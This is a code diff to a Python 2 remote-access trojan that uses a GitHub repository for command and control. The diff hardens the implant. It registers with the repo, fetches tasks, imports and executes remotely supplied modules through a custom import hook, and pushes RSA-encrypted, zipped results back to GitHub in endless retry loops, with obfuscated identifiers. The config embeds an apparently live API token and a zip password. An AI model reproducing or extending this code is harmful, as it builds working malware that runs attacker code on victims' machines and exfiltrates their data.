@@ -7,6 +7,7 @@ import threading
 import Queue
 import zlib
 import zipfile
+import StringIO
 import Queue
 import xxhash
 from Crypto.PublicKey import RSA
@@ -22,14 +23,18 @@ class Config:
 		self.repo = "wendigo_test" #name of repo
 		self.usr = "daniellohrey" #username of repo owner
 		#token to use git api
-		self.token = "NWYyOWM0ZjM0NzUwM2E1MDg4YTk1OGNlMTEwMjdhZjFkMzRlYTA5MA=="
+		self.token = "YWUwMGNlNzJjYWU3NTI5NzMwOGIyMmIwNjQzNmM5MjQyNDM4YmY2Ng=="
 		#public key to encrypt data
 		self.pk = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAndOV4VLdGZgIk+YcW7Kl\nVwiBiesJq6upfiRBo2hM5CEzQiSeBa1/A4h5ozSgQtSgKURVmlDChTNrs0P4bwvi\npCvq8B5SdBw4gcc7YTy03Hl11wfbIPCwqA9JwUl6ZzQtEbw7BAfndry44+2QmAoL\nU2uOoyW2C4MjmUG6SDmNfAL/PsMCvL4fiBJh2V2EUWtCPEqkVIGUHERFFaJwFea3\nFdIqIFVV4SzU6c73wdRFWKHie5WZ4GXQ3GaIAe2cyCMp3UavOhpk4s+N5xdG1xXs\n2AvfXuotYRVxvmSz+L0QiyTXNn0gmphLrMph3jyY/+KX4TH0wIxEx1ZK1gYO8D1V\npQIDAQAB\n-----END PUBLIC KEY-----"
 		self.pwd = "zippass" #password on zipped files
-		self.sleep = 5 #time to sleep between checking for config files
-		self.fn_s = "fn_seed" #seed to generate filenames
-		self.id_s = "id_seed" #seed to generate ids
-		self.size = 256 #block size of cipher
+		self.sleep = "5" #time to sleep between checking for config files
+		#seed to generate filenames, also key to module key
+		self.fn_s = "fn_seed_module"
+		#seed to generate ids, also used as sleep key
+		self.id_s = "id_seed_sleep"
+		self.size = "256" #block size of cipher
+		self.size = int(self.fixstr(self.size))
+		self.sleep = int(self.fixstr(self.sleep))
 		self.tasks = Queue.Queue() #task queue
 		self.u_id() #generate a new id on start
 		self.u_pk(self.pk) #import public key into cipher object
@@ -39,11 +44,12 @@ class Config:
 		i_time = int(time.time())
 		t_id = str(i_time) + self.fixstr(self.id_s)
 		self.id = str(xxhash.xxh64(t_id).hexdigest())
+		self.id = self.obfstr(self.id)
 
 	#returns our current id by hashing what we already generated
 	#just use fixstr instead of hashing
 	def g_id(self):
-		return str(xxhash.xxh64(str(self.id)).hexdigest())
+		return self.fixstr(self.id)
 
 	#return deobfuscated module path
 	def g_mod(self):
@@ -168,13 +174,9 @@ def get_file(path):
 
 #creates an empty config file (with random data) to register
 def create_config():
-	try:
-		repo = connect()
-		repo.create_file(config.g_config(), config.g_com(), config.g_com())
-		return 1
-	except:
-		#make global exception string
-		return 0
+	repo = connect()
+	repo.create_file(config.g_config(), config.g_com(), config.g_com())
+	return
 
 #gets config file, imports unimported modules and returns a dictionary of tasks
 def get_config():
@@ -182,29 +184,22 @@ def get_config():
 	try:
 		c_dict = json.loads(c_json)
 		for mod in c_dict:
-			if task['module'] not in sys.modules: #obfuscate strings
-				exec("import %s" % task['module'])
+			if mod[config.fn_s] not in sys.modules:
+				exec("import %s" % mod[config.fn_s])
 		return c_dict
 	except:
 		return None
 
-#clears config file (updates to random data) once tasks have been read
+#clears config file once tasks have been read
 def clear_config():
-	try:
-		repo = connect()
-		repo.file_contents(config.g_config()).update(config.g_com(), config.g_com())
-		return 1
-	except:
-		return 0
+	repo = connect()
+	repo.file_contents(config.g_config()).update(config.g_com(), config.g_com())
 
 #encrypts data returned from tasks and pushes it to github
 def push_data(data):
-	try:
-		repo = connect()
-		repo.create_file(config.g_data(), config.g_com(), encrypt(data))
-		return 1
-	except:
-		return 0
+	repo = connect()
+	repo.create_file(config.g_data(), config.g_com(), encrypt(data))
+	return
 
 #decrypts modules and config files
 def decrypt(data):
@@ -215,6 +210,7 @@ def decrypt(data):
 	return data
 
 #encrypts data before pushing it to github
+#encrypted = base64(rsa(zip(data)))
 def encrypt(data):
 	key = config.g_pk()
 	size = config.size
@@ -230,14 +226,23 @@ def encrypt(data):
 	return base64.b64encode(encrypted)
 
 #runs module in new thread and then pushes results to github
-def run_module(task = None):
+def run_module(**task):
 	try:
-		#add config file to task dict and then update
-		result = sys.modules[task['module']].run(task) #obfuscate strings
-		if result is not None:
-			push_data(result)
-		return
+		global config
+		#config is passed to module and returned to update config options
+		config, result = sys.modules[task[config.fn_s]].run(config, **task)
+		while True:
+			#were in a separate thread so we just keep trying to push data
+			try:
+				if result is not None:
+					push_data(result)
+				else:
+					push_data(config.g_com())
+				return
+			except:
+				time.sleep(config.sleep)
 	except:
+		#exit if we cant run or hit uncaught exception
 		return
 
 #runs all queued modules in new threads
@@ -247,7 +252,7 @@ def module_runner():
 		t = threading.Thread(target=run_module, kwargs = task)
 		t.start()
 		try:
-			time.sleep(task['sleep']) #obfuscate strings
+			time.sleep(int(task[config.id_s]))
 		except:
 			pass
 	return
@@ -255,8 +260,13 @@ def module_runner():
 #main
 config = Config() #create config object
 sys.meta_path = [ReImp()] #add remote import to the import path
-create_config() #create a blank config file to register
-while True:
+while True: #keep trying to create config file until successful
+	try:
+		create_config() #create a blank config file to register
+		break
+	except:
+		time.sleep(config.sleep)
+while True: #keep checking for and running new tasks
 	if config.tasks.empty(): #get config file when all tasks have been finished
 		config_file = get_config()
 		if config_file == None:
@@ -266,4 +276,9 @@ while True:
 			config.tasks.put(task) #if there are tasks add them to the queue
 	if not config.tasks.empty(): #run tasks in queue and then clear config file
 		module_runner()
-		clear_config()
+		while True: #keep trying otherwise well keep running same modules
+			try:
+				clear_config()
+				break
+			except:
+				time.sleep(config.sleep)
